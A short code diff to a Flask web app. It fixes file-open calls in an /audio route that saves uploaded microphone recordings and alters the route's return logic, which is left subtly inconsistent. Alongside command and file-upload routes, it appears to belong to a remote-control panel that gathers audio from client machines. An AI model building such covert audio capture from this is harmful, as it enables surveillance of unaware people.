@@ -12,6 +12,7 @@ firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
 startTime = time()
 spam = False
+send = False
 selected_user = "93"
 output = ""
 control_data = {}
@@ -517,10 +518,10 @@ def cmd():
 @app.route("/audio",methods=["GET","POST"])
 def audio():
 	if request.method == "POST":
-		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav","wb")) as file:
+		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
 			file.write(request.data)
-		with open(os.path.join(STATIC_FOLDER,"mic","time.txt","w")) as file:
-			file.write(datetime.now())
+			return Response("data: play\n\n", mimetype='text/event-stream') if request.method == "GET" else "stored"
+		
 @app.route("/upload-files",methods=["POST", "GET"])
 def upload_files():
 	if request.method == "POST":
